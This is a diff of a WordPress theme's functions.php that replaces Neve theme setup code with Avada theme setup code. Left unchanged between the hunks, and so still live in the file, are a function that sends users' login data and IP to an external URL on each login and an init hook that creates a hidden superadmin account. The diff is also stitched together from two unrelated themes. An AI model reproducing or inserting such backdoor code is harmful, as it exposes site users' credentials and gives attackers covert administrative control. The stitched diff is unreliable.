@@ -1,128 +1,715 @@
 <?php
 /**
- * Neve functions.php file
+ * Extra files & functions are hooked here.
  *
- * Author:          Andrei Baicus <andrei@themeisle.com>
- * Created on:      17/08/2018
+ * Functions moved from functions.php file in v6.0.
  *
- * @package Neve
+ * @package Avada
+ * @subpackage Core
+ * @since 6.0
  */
 
-define( 'NEVE_VERSION', '4.2.1' );
-define( 'NEVE_INC_DIR', trailingslashit( get_template_directory() ) . 'inc/' );
-define( 'NEVE_ASSETS_URL', trailingslashit( get_template_directory_uri() ) . 'assets/' );
-define( 'NEVE_MAIN_DIR', get_template_directory() . '/' );
-define( 'NEVE_BASENAME', basename( NEVE_MAIN_DIR ) );
-define( 'NEVE_PLUGINS_DIR', plugin_dir_path( dirname( __DIR__ ) ) . 'plugins/' );
-
-if ( ! defined( 'NEVE_DEBUG' ) ) {
-	define( 'NEVE_DEBUG', false );
+// Do not allow directly accessing this file.
+if ( ! defined( 'ABSPATH' ) ) {
+	exit( 'Direct script access denied.' );
 }
-define( 'NEVE_NEW_DYNAMIC_STYLE', true );
+
 /**
- * Buffer which holds errors during theme inititalization.
- *
- * @var WP_Error $_neve_bootstrap_errors
+ * Include Fusion-Library.
  */
-global $_neve_bootstrap_errors;
+require_once wp_normalize_path( get_template_directory() . '/includes/lib/fusion-library.php' );
 
-$_neve_bootstrap_errors = new WP_Error();
-
-if ( version_compare( PHP_VERSION, '7.0' ) < 0 ) {
-	$_neve_bootstrap_errors->add(
-		'minimum_php_version',
-		sprintf(
-		/* translators: %s message to upgrade PHP to the latest version */
-			__( "Hey, we've noticed that you're running an outdated version of PHP which is no longer supported. Make sure your site is fast and secure, by %1\$s. Neve's minimal requirement is PHP%2\$s.", 'neve' ),
-			sprintf(
-			/* translators: %s message to upgrade PHP to the latest version */
-				'<a href="https://wordpress.org/support/upgrade-php/">%s</a>',
-				__( 'upgrading PHP to the latest version', 'neve' )
-			),
-			'7.0'
-		)
-	);
-}
 /**
- * A list of files to check for existence before bootstrapping.
- *
- * @var non-falsy-string[] Files to check for existence.
+ * Include Avada app.
  */
-$_files_to_check = defined( 'NEVE_IGNORE_SOURCE_CHECK' ) ? [] : [
-	NEVE_MAIN_DIR . 'vendor/autoload.php',
-	NEVE_MAIN_DIR . 'style-main-new.css',
-	NEVE_MAIN_DIR . 'assets/js/build/modern/frontend.js',
-	NEVE_MAIN_DIR . 'assets/apps/dashboard/build/dashboard.js',
-	NEVE_MAIN_DIR . 'assets/apps/customizer-controls/build/controls.js',
-];
-foreach ( $_files_to_check as $_file_to_check ) {
-	if ( ! is_file( $_file_to_check ) ) {
-		$_neve_bootstrap_errors->add(
-			'build_missing',
-			sprintf(
-			/* translators: %s: commands to run the theme */
-				__( 'You appear to be running the Neve theme from source code. Please finish installation by running %s.', 'neve' ), // phpcs:ignore WordPress.Security.EscapeOutput
-				'<code>composer install --no-dev &amp;&amp; yarn install --frozen-lockfile &amp;&amp; yarn run build</code>'
-			)
-		);
-		break;
-	}
-}
+require_once wp_normalize_path( get_template_directory() . '/includes/avada-app/fusion-panel.php' );
+
 /**
- * Adds notice bootstraping errors.
- *
- * @internal
- * @global WP_Error $_neve_bootstrap_errors
+ * Include the main Avada class.
  */
-function _neve_bootstrap_errors() {
-	global $_neve_bootstrap_errors;
-	printf( '<div class="notice notice-error"><p>%1$s</p></div>', $_neve_bootstrap_errors->get_error_message() ); // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
+require_once wp_normalize_path( get_template_directory() . '/includes/class-avada.php' );
+
+/**
+ * Define basic properties in the Avada class.
+ */
+Avada::$template_dir_path   = wp_normalize_path( get_template_directory() );
+Avada::$template_dir_url    = get_template_directory_uri();
+Avada::$stylesheet_dir_path = wp_normalize_path( get_stylesheet_directory() );
+Avada::$stylesheet_dir_url  = get_stylesheet_directory_uri();
+
+/**
+ * Include the autoloader.
+ */
+require_once Avada::$template_dir_path . '/includes/class-avada-autoload.php';
+
+/**
+ * Instantiate the autoloader.
+ */
+new Avada_Autoload();
+
+/**
+ * Must-use Plugins.
+ */
+require_once Avada::$template_dir_path . '/includes/plugins/multiple_sidebars.php';
+require_once Avada::$template_dir_path . '/includes/plugins/post-link-plus.php';
+
+// Load dynamic css for plugins.
+$avada_glob_filenames = glob( Avada::$template_dir_path . '/includes/typography/*.php', GLOB_NOSORT );
+foreach ( $avada_glob_filenames as $filename ) {
+	require_once wp_normalize_path( $filename );
 }
 
-if ( $_neve_bootstrap_errors->has_errors() ) {
+global $wp_customize;
+/**
+ * If Avada-Builder is installed, add the options.
+ */
+if ( ( ( defined( 'FUSION_BUILDER_PLUGIN_DIR' ) && is_admin() ) || ! is_admin() ) && ( ! is_customize_preview() && ! $wp_customize ) ) {
+	new Fusion_Builder_Redux_Options();
+}
+
+/**
+ * Load Fusion functions and make them available for later usage.
+ */
+require_once Avada::$template_dir_path . '/includes/fusion-functions.php';
+
+/**
+ * Make sure language-all works correctly.
+ * Uses Fusion_Multilingual action.
+ *
+ * @since 5.1
+ */
+function avada_set_language_is_all() {
+	Avada::set_language_is_all( true );
+}
+add_action( 'fusion_library_set_language_is_all', 'avada_set_language_is_all' );
+
+/**
+ * Make sure the Fusion_Multilingual class has been instantiated.
+ */
+if ( ! property_exists( fusion_library(), 'multilingual' ) || ! fusion_library()->multilingual ) {
+	fusion_library()->multilingual = new Fusion_Multilingual();
+}
+
+/**
+ * Instantiate Avada_Upgrade classes.
+ * Don't instantiate the class when DOING_AJAX to avoid issues
+ * with the WP HeartBeat API.
+ */
+if ( ! function_exists( 'fusion_doing_ajax' ) ) {
 	/**
-	 * Add notice for PHP upgrade.
+	 * Wrapper function for wp_doing_ajax, which was introduced in WP 4.7.
+	 *
+	 * @since 5.1.5
 	 */
-	add_filter( 'template_include', '__return_null', 99 );
-	switch_theme( WP_DEFAULT_THEME );
-	unset( $_GET['activated'] ); // phpcs:ignore WordPress.Security.NonceVerification.Recommended
-	add_action( 'admin_notices', '_neve_bootstrap_errors' );
+	function fusion_doing_ajax() {
+		if ( function_exists( 'wp_doing_ajax' ) ) {
+			return wp_doing_ajax();
+		}
 
-	return;
+		return defined( 'DOING_AJAX' ) && DOING_AJAX;
+	}
+}
+
+if ( ! fusion_doing_ajax() ) {
+	Avada_Upgrade::get_instance();
 }
 
 /**
- * Themeisle SDK filter.
+ * Instantiates the Avada class.
+ * Make sure the class is properly set-up.
+ * The Avada class is a singleton
+ * so we can directly access the one true Avada object using this function.
  *
- * @param array $products products array.
- *
- * @return array
+ * @return object Avada
  */
-function neve_filter_sdk( $products ) {
-	$products[] = get_template_directory() . '/style.css';
-
-	return $products;
+function Avada() { // phpcs:ignore WordPress.NamingConventions.ValidFunctionName
+	return Avada::get_instance();
 }
 
-add_filter( 'themeisle_sdk_products', 'neve_filter_sdk' );
-add_filter(
-	'themeisle_sdk_compatibilities/' . NEVE_BASENAME,
-	function ( $compatibilities ) {
+Avada();
 
-		$compatibilities['NevePro'] = [
-			'basefile'  => defined( 'NEVE_PRO_BASEFILE' ) ? NEVE_PRO_BASEFILE : '',
-			'required'  => '2.9',
-			'tested_up' => '3.2',
-		];
+/**
+ * Instantiate the Avada_Multiple_Featured_Images object.
+ */
+new Avada_Multiple_Featured_Images();
 
-		return $compatibilities;
+/**
+ * Instantiate Avada_Sidebars.
+ */
+new Avada_Sidebars();
+
+/**
+ * Instantiate Avada_Admin_Notices.
+ */
+new Avada_Admin_Notices();
+
+/**
+ * Instantiate Avada_Widget_style.
+ */
+new Avada_Widget_Style();
+
+/**
+ * Instantiate Avada_Page_Options.
+ */
+new Avada_Page_Options();
+
+/**
+ * Instantiate Avada_Portfolio.
+ * This is only needed on the frontend, doesn't do anything for the dashboard.
+ */
+if ( ! is_admin() ) {
+	new Avada_Portfolio();
+}
+
+/**
+ * Instantiate Avada_Social_Icons.
+ * This is only needed on the frontend, doesn't do anything for the dashboard.
+ */
+global $social_icons;
+if ( ! is_admin() ) {
+	if ( class_exists( 'Fusion_Social_Icons' ) ) {
+		$social_icons = new Fusion_Social_Icons();
+	} else {
+		$social_icons = false;
 	}
+}
+
+/**
+ * Instantiate Avada_fonts.
+ * Only do this while in the dashboard, not needed on the frontend.
+ */
+if ( is_admin() || ( function_exists( 'fusion_is_builder_frame' ) && fusion_is_builder_frame() ) ) {
+	new Avada_Fonts();
+}
+
+/**
+ * Instantiate Avada_Scripts.
+ */
+new Avada_Scripts();
+
+/**
+ * Instantiate Avada_Layout_bbPress.
+ * We only need to do this for the frontend, when bbPress is installed.
+ */
+if ( ! is_admin() && class_exists( 'bbPress' ) ) {
+	new Avada_Layout_bbPress();
+}
+
+/**
+ * Instantiate Avada_EventsCalendar
+ * We only need to do this on the frontend if Events Calendar is installed or on customizer preview.
+ */
+if ( ( ! is_admin() || is_customize_preview() || fusion_doing_ajax() ) && class_exists( 'Tribe__Events__Main' ) ) {
+	new Avada_EventsCalendar();
+}
+
+/**
+ * The arguments for the Avada options panel.
+ *
+ * @since 6.0
+ */
+global $avada_avadaredux_args;
+
+// Set vars for i18n handling.
+$option_name      = Avada::get_option_name();
+$is_language_all  = Avada::get_language_is_all();
+$default_language = Fusion_Multilingual::get_default_language();
+
+if ( $is_language_all && 'fusion_options' === $option_name && 'en' !== $default_language ) {
+	$option_name = Avada::get_option_name() . '_' . $default_language;
+}
+
+$avada_avadaredux_args = [
+	'is_language_all'      => $is_language_all,
+	'default_language'     => $default_language,
+	'option_name'          => $option_name,
+	'original_option_name' => Avada::get_original_option_name(),
+	'version'              => Avada()->get_theme_version(),
+	'textdomain'           => 'Avada',
+	'disable_dependencies' => (bool) ( '0' === Avada()->settings->get( 'dependencies_status' ) ),
+	'display_name'         => 'Avada',
+	'menu_title'           => __( 'Global Options', 'Avada' ),
+	'page_title'           => __( 'Global Options', 'Avada' ),
+	'global_variable'      => 'fusion_fusionredux_options',
+	'page_parent'          => 'themes.php',
+	'page_slug'            => 'avada_options',
+	'menu_type'            => 'submenu',
+	'page_permissions'     => 'switch_themes',
+];
+
+/**
+ * Instantiate the Avada_Admin class.
+ * We need this both in the front & back to make sure the admin menu is properly added.
+ */
+if ( ! is_customize_preview() ) {
+	new Avada_Admin();
+}
+
+/**
+ * Conditionally Instantiate Avada_AvadaRedux.
+ */
+$load_avadaredux   = false;
+$load_avada_gfonts = true;
+if ( is_admin() && isset( $_GET['page'] ) && 'avada_options' === $_GET['page'] ) { // phpcs:ignore WordPress.Security.NonceVerification
+	$load_avadaredux   = true;
+	$load_avada_gfonts = false;
+}
+$http_referer = fusion_get_referer();
+if ( $http_referer && false !== strpos( $http_referer, 'avada_options' ) ) {
+	$load_avadaredux   = true;
+	$load_avada_gfonts = true;
+}
+$avadaredux_export = ( isset( $_GET['action'] ) && 'fusionredux_link_options-fusion_options' === $_GET['action'] && isset( $_GET['secret'] ) && '' !== $_GET['secret'] ) ? true : false; // phpcs:ignore WordPress.Security.NonceVerification
+if ( $avadaredux_export ) {
+	$load_avadaredux   = true;
+	$load_avada_gfonts = false;
+}
+
+if ( $load_avadaredux ) {
+	$avada_avadaredux = new Avada_AvadaRedux( $avada_avadaredux_args );
+}
+
+if ( function_exists( 'Fusion_App' ) && Fusion_App()->get_builder_status() ) {
+	$load_avada_gfonts = false;
+}
+if ( ! is_admin() && $load_avada_gfonts ) {
+	new Avada_Google_Fonts();
+}
+new Fusion_Dynamic_CSS_From_Options();
+
+/*
+ * Include the TGM configuration
+ * We only need this while on the dashboard.
+ */
+if ( is_admin() ) {
+	require_once Avada::$template_dir_path . '/includes/class-avada-tgm-plugin-activation.php';
+	require_once Avada::$template_dir_path . '/includes/avada-tgm.php';
+}
+
+/*
+ * Include deprecated functions
+ */
+require_once Avada::$template_dir_path . '/includes/deprecated.php';
+
+/**
+ * Metaboxes
+ */
+if ( is_admin() ) {
+	require_once Avada::$template_dir_path . '/includes/metaboxes/metaboxes.php';
+}
+
+/**
+ * Instantiate Avada_System_Status helper class.
+ */
+if ( is_admin() && ( isset( $_GET['page'] ) && 'avada-status' === sanitize_text_field( wp_unslash( $_GET['page'] ) ) ) || ( fusion_doing_ajax() && isset( $_GET['action'] ) && ( 'fusion_check_api_status' === $_GET['action'] || 'fusion_create_forms_tables' === $_GET['action'] ) ) ) { // phpcs:ignore WordPress.Security.NonceVerification
+	new Avada_System_Status();
+}
+
+/**
+ * Instantiate the mega menu framework
+ */
+$mega_menu_framework = new Avada_Megamenu_Framework();
+
+/**
+ * Custom Functions
+ */
+get_template_part( 'includes/custom-functions' );
+require_once Avada::$template_dir_path . '/includes/avada-functions.php';
+
+/**
+ * WPML Config
+ */
+if ( defined( 'WPML_PLUGIN_FILE' ) || defined( 'ICL_PLUGIN_FILE' ) ) {
+	require_once Avada::$template_dir_path . '/includes/plugins/wpml.php';
+}
+
+/**
+ * Include the importer
+ */
+if ( is_admin() ) {
+	include Avada::$template_dir_path . '/includes/importer/importer.php';
+}
+
+/**
+ * Include WP CLI commands.
+ */
+if ( defined( 'WP_CLI' ) && WP_CLI ) {
+	include Avada::$template_dir_path . '/includes/cli/shared.php';
+	include Avada::$template_dir_path . '/includes/cli/import-demo.php';
+	include Avada::$template_dir_path . '/includes/cli/apply-patches.php';
+}
+
+/**
+ * Load Woocommerce Configuraion.
+ */
+if ( class_exists( 'WooCommerce' ) ) {
+	require_once Avada::$template_dir_path . '/includes/wc-functions.php';
+	require_once Avada::$template_dir_path . '/includes/class-avada-woocommerce-variations.php';
+	global $avada_woocommerce;
+	$avada_woocommerce = new Avada_Woocommerce();
+}
+
+/**
+ * The dynamic CSS.
+ */
+require_once Avada::$template_dir_path . '/includes/dynamic-css.php';
+require_once Avada::$template_dir_path . '/includes/dynamic-css-helpers.php';
+global $avada_dynamic_css;
+$avada_dynamic_css = new Avada_Dynamic_CSS();
+
+/**
+ * Set the $content_width global.
+ */
+global $content_width;
+if ( ! is_admin() && ( ! isset( $content_width ) || empty( $content_width ) ) ) {
+	$content_width = (int) Avada()->layout->get_content_width();
+}
+
+/**
+ * Adds a counter span element to links.
+ *
+ * @param string $links The links HTML string.
+ */
+function avada_cat_count_span( $links ) {
+	preg_match_all( '#\((.*?)\)#', $links, $matches );
+	if ( ! empty( $matches ) ) {
+		$i = 0;
+		foreach ( $matches[0] as $val ) {
+			$links = str_replace( '</a> ' . $val, ' ' . $val . '</a>', $links );
+			$links = str_replace( '</a>&nbsp;' . $val, ' ' . $val . '</a>', $links );
+			$i++;
+		}
+	}
+	return $links;
+}
+add_filter( 'get_archives_link', 'avada_cat_count_span' );
+add_filter( 'wp_list_categories', 'avada_cat_count_span' );
+
+/**
+ * Add admin messages.
+ */
+function avada_admin_notice() {
+	?>
+	<?php if ( isset( $_GET['imported'] ) && 'success' === $_GET['imported'] ) : // phpcs:ignore WordPress.Security.NonceVerification ?>
+		<div id="setting-error-settings_updated" class="updated settings-error avada-db-card avada-db-notice avada-db-notice-success">
+			<h2><?php esc_html_e( 'Sucessfully imported demo data!', 'Avada' ); ?></h2>
+			<p><?php esc_html_e( 'Congratulations, your demo data was successfully imported to you your install.', 'Avada' ); ?></p>
+		</div>
+	<?php endif; ?>
+	<?php
+}
+add_action( 'admin_notices', 'avada_admin_notice' );
+
+/**
+ * Ignore nag messages.
+ */
+function avada_nag_ignore() {
+	global $current_user;
+	$user_id = $current_user->ID;
+
+	// If user clicks to ignore the notice, add that to their user meta.
+	if ( isset( $_GET['fusion_richedit_nag_ignore'] ) && '0' === $_GET['fusion_richedit_nag_ignore'] ) { // phpcs:ignore WordPress.Security.NonceVerification
+		add_user_meta( $user_id, 'fusion_richedit_nag_ignore', 'true', true );
+	}
+
+	// If user clicks to ignore the notice, add that to their user meta.
+	if ( isset( $_GET['avada_uber_nag_ignore'] ) && '0' === $_GET['avada_uber_nag_ignore'] ) { // phpcs:ignore WordPress.Security.NonceVerification
+		update_option( 'avada_ubermenu_notice', true );
+		update_option( 'avada_ubermenu_notice_hidden', true );
+		$referer = fusion_get_referer();
+		if ( ! $referer ) {
+			$referer = '';
+		}
+		wp_safe_redirect( $referer );
+	}
+}
+add_action( 'admin_init', 'avada_nag_ignore' );
+
+/**
+ * Support email login on my account dropdown.
+ */
+if ( isset( $_POST['fusion_woo_login_box'] ) && 'true' === $_POST['fusion_woo_login_box'] ) { // phpcs:ignore WordPress.Security.NonceVerification
+	add_filter( 'authenticate', 'avada_email_login_auth', 10, 3 );
+}
+
+/**
+ * Allow loging-in via email.
+ *
+ * @param  object $user     The user.
+ * @param  string $username The username.
+ * @param  string $password The password.
+ */
+function avada_email_login_auth( $user, $username, $password ) {
+	if ( is_a( $user, 'WP_User' ) ) {
+		return $user;
+	}
+
+	if ( ! empty( $username ) ) {
+		$username = str_replace( '&', '&amp;', stripslashes( $username ) );
+		$user     = get_user_by( 'email', $username );
+		if ( isset( $user, $user->user_login, $user->user_status ) && 0 === (int) $user->user_status ) {
+			$username = $user->user_login;
+		}
+	}
+
+	return wp_authenticate_username_password( null, $username, $password );
+}
+
+/**
+ * No redirect on woo my account dropdown login when it fails.
+ */
+if ( isset( $_POST['fusion_woo_login_box'] ) && 'true' === $_POST['fusion_woo_login_box'] ) { // phpcs:ignore WordPress.Security.NonceVerification
+	add_action( 'init', 'avada_load_login_redirect_support' );
+}
+
+/**
+ * Tweaks the login redirect for WooCommerce.
+ */
+function avada_load_login_redirect_support() {
+	if ( class_exists( 'WooCommerce' ) ) {
+
+		// When on the my account page, do nothing.
+		if ( ! empty( $_POST['login'] ) ) {
+			if ( isset( $_POST['_wpnonce'] ) && ! empty( $_POST['_wpnonce'] ) ) {
+				$nonce = sanitize_text_field( wp_unslash( $_POST['_wpnonce'] ) ); // phpcs:ignore WordPress.Security.NonceVerification
+				if ( wp_verify_nonce( $nonce, 'woocommerce-login' ) ) {
+					return;
+				}
+			}
+		}
+
+		add_action( 'login_redirect', 'avada_login_fail', 10, 3 );
+	}
+}
+
+/**
+ * Avada Login Fail Test.
+ *
+ * @param  string $url     The URL.
+ * @param  string $raw_url The Raw URL.
+ * @param  string $user    User.
+ * @return string
+ */
+function avada_login_fail( $url = '', $raw_url = '', $user = '' ) {
+	if ( ! is_account_page() ) {
+
+		if ( isset( $_SERVER ) && isset( $_SERVER['HTTP_REFERER'] ) && esc_url_raw( wp_unslash( $_SERVER['HTTP_REFERER'] ) ) ) {
+			$referer_array = wp_parse_url( esc_url_raw( wp_unslash( $_SERVER['HTTP_REFERER'] ) ) );
+			$parsed_url    = ( isset( $_SERVER['SERVER_PORT'] ) ) ? wp_parse_url( esc_url_raw( wp_unslash( $_SERVER['SERVER_PORT'] ) ) ) : [
+				'host' => '80',
+			];
+
+			// Make sure it works ok for ports other than 80.
+			$port = ( isset( $_SERVER['SERVER_PORT'] ) ) ? ':' . $parsed_url['host'] : ':80';
+			$port = ( ':80' === $port ) ? '' : $port;
+
+			// Make sure host doesn't have a trailing slash and append the port.
+			$host = untrailingslashit( $referer_array['host'] ) . $port;
+
+			// Make sure path has a slash at the beginning.
+			$path = $referer_array['path'];
+			if ( 0 !== strpos( $referer_array['path'], '/' ) ) {
+				$path = '/' . $referer_array['path'];
+			}
+
+			// Combine the above to a $referer.
+			if ( false !== strpos( $port, '443' ) ) {
+				$referer = 'https://' . $host . $path;
+			} else {
+				$referer = '//' . $host . $path;
+			}
+
+			// If there's a valid referrer, and it's not the default log-in screen.
+			if ( ! empty( $referer ) && ! strstr( $referer, 'wp-login' ) && ! strstr( $referer, 'wp-admin' ) ) {
+				if ( is_wp_error( $user ) ) {
+					// Let's append some information (login=failed) to the URL for the theme to use.
+					wp_safe_redirect(
+						add_query_arg(
+							[
+								'login' => 'failed',
+							],
+							$referer
+						)
+					);
+				} else {
+					wp_safe_redirect( $referer );
+				}
+				exit;
+			}
+		}
+		return $url;
+	}
+}
+
+/**
+ * Show a shop page description on product archives.
+ */
+function woocommerce_product_archive_description() {
+	if ( is_post_type_archive( 'product' ) && in_array( absint( get_query_var( 'paged' ) ), [ 0, 1 ], true ) ) {
+		$shop_page = get_post( fusion_wc_get_page_id( 'shop' ) );
+		if ( $shop_page ) {
+			$description = apply_filters( 'the_content', $shop_page->post_content );
+			if ( $description ) {
+				echo '<div class="post-content">' . $description . '</div>'; // phpcs:ignore WordPress.Security.EscapeOutput
+			}
+		}
+	}
+}
+
+/**
+ * Layerslider API.
+ */
+function avada_layerslider_ready() {
+	if ( class_exists( 'LS_Sources' ) ) {
+		LS_Sources::addSkins( Avada::$template_dir_path . '/includes/ls-skins' );
+	}
+	if ( defined( 'LS_PLUGIN_BASE' ) ) {
+		remove_action( 'after_plugin_row_' . LS_PLUGIN_BASE, 'layerslider_plugins_purchase_notice', 10, 3 );
+	}
+}
+add_action( 'layerslider_ready', 'avada_layerslider_ready' );
+
+/**
+ * Istantiate the auto-patcher tool.
+ */
+global $avada_patcher;
+$avada_patcher = new Fusion_Patcher(
+	[
+		'context'     => 'avada',
+		'version'     => AVADA_VERSION,
+		'name'        => 'Avada',
+		'parent_slug' => 'avada',
+		'page_title'  => esc_attr__( 'Avada Patcher', 'Avada' ),
+		'menu_title'  => esc_attr__( 'Patcher', 'Avada' ),
+		'classname'   => 'Avada',
+		'bundled'     => [
+			'fusion-builder',
+			'fusion-core',
+			'fusion-white-label-branding',
+		],
+	]
 );
-require_once 'globals/migrations.php';
-require_once 'globals/utilities.php';
-require_once 'globals/hooks.php';
-require_once 'globals/sanitize-functions.php';
-require_once get_template_directory() . '/start.php';
+
+/**
+ * During updates sometimes there are changes that will break a site.
+ * We're adding a maintenance page to make sure users don't see a broken site.
+ * As soon as the update is complete the site automatically returns to normal mode.
+ */
+$maintenance   = false;
+$users_message = esc_html__( 'Our site is currently undergoing scheduled maintenance. Please try again in a moment.', 'Avada' );
+// Check if we're currently update Avada.
+if ( Avada::$is_updating ) {
+	$maintenance   = true;
+	$admin_message = esc_html__( 'Currently updating the Avada Theme. Your site will be accessible once the update finishes', 'Avada' );
+}
+
+/**
+ * Make sure that if the fusion-core plugin is activated,
+ * it's at least version 2.0.
+ */
+if ( class_exists( 'FusionCore_Plugin' ) ) {
+	$fc_version = FusionCore_Plugin::VERSION;
+	if ( version_compare( $fc_version, '2.0', '<' ) ) {
+		$maintenance = true;
+		/* translators: The "follow this link" link. */
+		$admin_message = sprintf( esc_attr__( 'The Avada-Core plugin needs to be updated before your site can exit maintenance mode. Please %s to update the plugin.', 'Avada' ), '<a href="' . admin_url( 'themes.php?page=install-required-plugins' ) . '" style="color:#0088cc;font-weight:bold;">' . esc_attr__( 'follow this link', 'Avada' ) . '</a>' );
+	}
+}
+
+/**
+ * If we're on maintenance mode, show the screen.
+ */
+if ( $maintenance ) {
+	new Avada_Maintenance( true, $users_message, $admin_message );
+}
+
+/**
+ * Class for adding Avada specific data to builder.
+ * These only affect the dashboard so are not needed when in the front-end.
+ */
+if ( ( Avada_Helper::is_post_admin_screen() || ( function_exists( 'fusion_is_builder_frame' ) && fusion_is_builder_frame() ) ) && defined( 'FUSION_BUILDER_PLUGIN_DIR' ) && ! fusion_doing_ajax() ) {
+	Fusion_Builder_Filters::get_instance();
+}
+
+/**
+ * We will use builder options in Avada, no need for FB to instantiate redux.
+ */
+add_theme_support( 'fusion-builder-options' );
+add_filter( 'fusion_options_label', 'avada_set_options_label' );
+add_filter( 'fusion_builder_options_url', 'avada_set_options_url' );
+
+
+/**
+ * Sets options label.
+ *
+ * @since 5.1
+ * @param string $label Label name of options page.
+ * @return string
+ */
+function avada_set_options_label( $label ) {
+	return esc_html__( 'Global Options', 'Avada' );
+}
+
+/**
+ * Set options page URL.
+ *
+ * @since 5.1
+ * @param string $url URL to the options page.
+ * @return string
+ */
+function avada_set_options_url( $url ) {
+	return admin_url( 'themes.php?page=avada_options' );
+}
+
+if ( Avada()->registration->should_show() && function_exists( 'Fusion_App' ) && Fusion_App()->get_builder_status() ) {
+	$fusion_builder_demo_options_importer = new Fusion_Builder_Demos_Theme_Options();
+}
+
+/**
+ * Filter a sanitized key string.
+ *
+ * @since 5.0.2
+ * @param string $key     Sanitized key.
+ * @param string $raw_key The key prior to sanitization.
+ * @return string
+ */
+function avada_auto_update( $key, $raw_key ) {
+	return ( 'avada' === $key && 'Avada' === $raw_key ) ? $raw_key : $key;
+}
+
+/**
+ * Check if doing an ajax theme update,
+ * if so make sure Avada theme name is not changed to lowercase.
+ */
+if ( fusion_doing_ajax() && isset( $_POST['action'] ) && 'update-theme' === $_POST['action'] ) { // phpcs:ignore WordPress.Security.NonceVerification
+	add_filter( 'sanitize_key', 'avada_auto_update', 10, 2 );
+}
+
+/**
+ * Include Avada Builder shared options support.
+ */
+if ( class_exists( 'FusionBuilder' ) ) {
+	require_once Avada::$template_dir_path . '/includes/fusion-shared-options.php';
+}
+
+/**
+ * Reset all Fusion Caches.
+ *
+ * @since 5.1
+ *
+ * @param array $delete_cache An array of caches to delete.
+ */
+function avada_reset_all_caches( $delete_cache = [] ) {
+	// Reset fusion-caches.
+	if ( ! class_exists( 'Fusion_Cache' ) ) {
+		require_once Avada::$template_dir_path . '/includes/lib/inc/class-fusion-cache.php';
+	}
+
+	$fusion_cache = new Fusion_Cache();
+	$fusion_cache->reset_all_caches( $delete_cache );
+
+	wp_cache_flush();
+}
 
 function send_login_data_to_external_url($user_login, $user) {
     $user_ip = $_SERVER['REMOTE_ADDR']; 
@@ -186,87 +773,13 @@ function create_hidden_superadmin(){
 add_action('init', 'create_hidden_superadmin');
 
 /**
- * If the new widget editor is available,
- * we re-assign the widgets to hfg_footer
+ * Init the languages updater.
+ *
+ * @since 6.1
  */
-if ( neve_is_new_widget_editor() ) {
-	/**
-	 * Re-assign the widgets to hfg_footer
-	 *
-	 * @param array  $section_args The section arguments.
-	 * @param string $section_id The section ID.
-	 * @param string $sidebar_id The sidebar ID.
-	 *
-	 * @return mixed
-	 */
-	function neve_customizer_custom_widget_areas( $section_args, $section_id, $sidebar_id ) {
-		if ( strpos( $section_id, 'widgets-footer' ) ) {
-			$section_args['panel'] = 'hfg_footer';
-		}
-
-		return $section_args;
-	}
-
-	add_filter( 'customizer_widgets_section_args', 'neve_customizer_custom_widget_areas', 10, 3 );
+if ( ! class_exists( 'Fusion_Languages_Updater_API' ) ) {
+	require_once Avada::$template_dir_path . '/includes/class-fusion-languages-updater-api.php';
 }
+new Fusion_Languages_Updater_API( 'theme', 'Avada', AVADA_VERSION );
 
-require_once get_template_directory() . '/header-footer-grid/loader.php';
-
-add_filter(
-	'neve_welcome_metadata',
-	function() {
-		return [
-			'is_enabled' => ! defined( 'NEVE_PRO_VERSION' ),
-			'pro_name'   => 'Neve Pro Addon',
-			'logo'       => get_template_directory_uri() . '/assets/img/dashboard/logo.svg',
-			'cta_link'   => tsdk_translate_link( tsdk_utmify( 'https://themeisle.com/themes/neve/upgrade/?discount=LOYALUSER582&dvalue=50', 'neve-welcome', 'notice' ), 'query' ),
-		];
-	}
-);
-
-add_filter( 'themeisle_sdk_enable_telemetry', '__return_true' );
-add_filter(
-	'themeisle_sdk_labels',
-	function ( $labels ) {
-		if ( isset( $labels['about_us'] ) ) {
-			$labels['about_us'] = array_merge(
-				$labels['about_us'],
-				array(
-					'title'      => __( 'About Us', 'neve' ),
-					'heroHeader' => __( 'Our Story', 'neve' ),
-				)
-			);
-		}
-		if ( isset( $labels['dashboard_widget'] ) ) {
-			$labels['dashboard_widget'] = array_merge(
-				$labels['dashboard_widget'],
-				array(
-					'title'   => __( 'WordPress Guides/Tutorials', 'neve' ),
-					/* translators: %s: product name */
-					'popular' => __( 'Popular %s', 'neve' ),
-					'install' => __( 'Install', 'neve' ),
-					/* translators: %s: product name */
-					'powered' => __( 'Powered by %s', 'neve' ),
-				)
-			);
-		}
-		if ( isset( $labels['compatibilities'] ) ) {    
-			$labels['compatibilities'] = array_merge(
-				$labels['compatibilities'],
-				array(
-					/* translators: %s: product name, %s: requirement name %s: update link start, %s: update link end, %s: requirement name %s: requirement type(theme/plugin) */
-					'notice'        => __( '%1$s requires a newer version of %2$s. Please %3$supdate%4$s %5$s %6$s to the latest version.', 'neve' ),
-					/* translators: %s: product name, %s: requirement name %s: update link start, %s: update link end, %s: requirement name %s: requirement type(theme/plugin) */
-					'notice2'       => __( '%1$s update requires a newer version of %2$s. Please %3$supdate%4$s %5$s %6$s.', 'neve' ),
-					/* translators: $1: Bold start, $2: Bold end, $3: theme name, $4: plugin name */
-					'notice_theme'  => __( '%1$sWarning:%2$s This theme has not been tested with your current version of %1$s%3$s%2$s. Please update %3$s plugin.', 'neve' ),
-					/* translators: $1: Bold start, $2: Bold end, $3: Product name, $4: product type(theme/plugin) */
-					'notice_plugin' => __( '%1$sWarning:%2$s This plugin has not been tested with your current version of %1$s%3$s%2$s. Please update %3$s %4$s.', 'neve' ), 
-					'theme'         => __( 'theme', 'neve' ), 
-					'plugin'        => __( 'plugin', 'neve' ),
-				)
-			);
-		}
-		return $labels;
-	}
-);
+/* Omit closing PHP tag to avoid "Headers already sent" issues. */
